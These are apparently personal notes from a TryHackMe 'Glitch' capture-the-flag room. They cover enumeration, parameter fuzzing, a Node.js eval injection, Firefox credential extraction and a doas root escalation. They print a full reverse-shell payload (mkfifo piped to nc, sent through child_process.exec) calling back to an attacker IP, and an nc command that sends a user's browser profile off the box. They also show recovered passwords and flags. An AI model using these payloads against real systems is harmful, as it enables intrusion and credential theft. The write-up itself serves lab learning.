
### Nmap

```
─[glack@parrot]─[~/Desktop/pentestmoneky_php_reverse_shell]
└──╼ $nmap -sV -sT -A 10.10.88.206


PORT   STATE  SERVICE VERSION
80/tcp open http
```


### HTTP

- it takes some time to load 
- Javascript contains 
```js

      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    
```

- On accessing `http://10.10.88.206/api/access`, we get `"dGhpc19pc19ub3RfcmVhbA=="`
```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/colddbox]
└──╼ $echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
this_is_not_real
```


- Ferox gives this 
```
─[glack@parrot]─[~/Desktop/THM/colddbox]
└──╼ $feroxbuster -u http://10.10.88.206/ -w /usr/share/wordlists/small.txt -n -x html,php


http://10.10.88.206/secret
```

- on chaing your `cookie:value` to the one which we find above we get to view the cntents of the web page
- Intercepted the request on burp and removed this head `If-None-Match: W/"1ce-/Vi8p4LWVNPsMVehHw0bmet19c0"` then we can see the response of `HTTP 200`
- Tried some random things including `

```
─[✗]─[glack@parrot]─[~/Desktop/THM/glitch]
└──╼ $stegcracker glitch.jpg /usr/share/wordlists/rockyou.txt
```

but found nothing so now went for the writeup

- so the hint was in `/api/items`, i did try that but maybe missed this. 
```
curl -X POST http://glitch.local/api/items
{"message":"there_is_a_glitch_in_the_matrix"}% 

```

- writeup used this command 
```
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 http://glitch.local/api/items\?FUZZ\=test
```

so we have to fuzz a parameter name using POST method so lets do that using ffuf

- i fine tuned my ffuf command

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/glitch]
└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt:FUZZ -u http://10.10.88.206/api/items?FUZZ=test -X POST -H 'Content-Type: application/x-www-form-urlencoded'
```

and got this

```
cmd                     [Status: 500, Size: 1081, Words: 55, Lines: 11, Duration: 146ms]
```

Now as per writeup

```
OK, so this looks like a `nodejs` application.... Looking at `eval (eval at router.post` it is trying to pass our argument to `eval`, Doing a quick _**Insert search verb here**_ for `nodejs eval rce` I end up at [https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44). 

Using the method from here with our reverse shell urlencoded via burp we get a call back

`POST /api/items?cmd=require("child_process").exec("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E9%2E0%2E38%204444%20%3E%2Ftmp%2Ff") HTTP/1.1`
```


so we change the value of our `cmd` parameter , didnt really get the node.js vuln but undertood the cahnge in paylaod

- on testing this `POST /api/items?cmd=require("child_process").exec("id")` we get a response of `vulnerability_exploited [object Object]`

now using the payload `%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%37%2e%32%34%2e%31%38%39%20%39%39%39%32%20%3e%2f%74%6d%70%2f%66` i.e. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.24.189 9992 >/tmp/f`

``require("child_process").exec("id")``

final payload turns out to be 

```
/api/items?cmd=require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.24.189 9992 >/tmp/f")
```

- started a netcat listener and got a shell

```
$ id
uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev)

$ cat user.txt
THM{i_don't_know_why}

```

### Priv Esc

- Usefull stuff i found after running linpeas.sh

```
drwxr-xr-x 8 root root 4096 Jan 14  2021 /opt/doas/.git

```


```
Sudo version 1.8.21p2


# CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)


[CVE-2019-18634] sudo pwfeedback

```

- with nothing to be found i turned to writeup again
`https://apjone.uk/tryhackme-glitch/`

- there was a firefox directory here , i tried but the firefox was not getting downlaoded even after restarting the machine. will continue this tomorrow


- Used this metthod to transfer data from target machine to my machine

```
mkdir firefox
cd firefox
nc -l 9002 |tar xf -

On the box run:

cd /home/user/.firefox
tar cf - . | nc <ATTACKING_IP> 9002
```

- used this writeup `https://onlineblogzone.com/tryhackme-glitch-writeup/`

- So there is a tool out there that extracts all passwords from the firefox files 

```
There is a tool available to acquire all passwords within the Firefox files. You can find it [here](https://github.com/unode/firefox_decrypt). Run the following commands to get the passwords from Firefox.

git clone https://github.com/unode/firefox_decrypt.git
./firefox_decrypt/firefox_decrypt.py
./firefox_decrypt/firefox_decrypt.py b5w4643p.default-release/

```

- on following the steps i get the desired credentials

```

─[✗]─[glack@parrot]─[~/Desktop/THM/glitch]
└──╼ $./firefox_decrypt/firefox_decrypt.py b5w4643p.default-release


Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void
```

```
v0id@ubuntu:/home/user/.firefox$ id
id
uid=1001(v0id) gid=1001(v0id) groups=1001(v0id)
```


- We are easily able to get root shell using 

```
v0id@ubuntu:/home/user/.firefox$ doas -u root /bin/bash
doas -u root /bin/bash
Password: love_the_void

root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```


```
cat root.txt
THM{diamonds_break_our_aching_minds}
```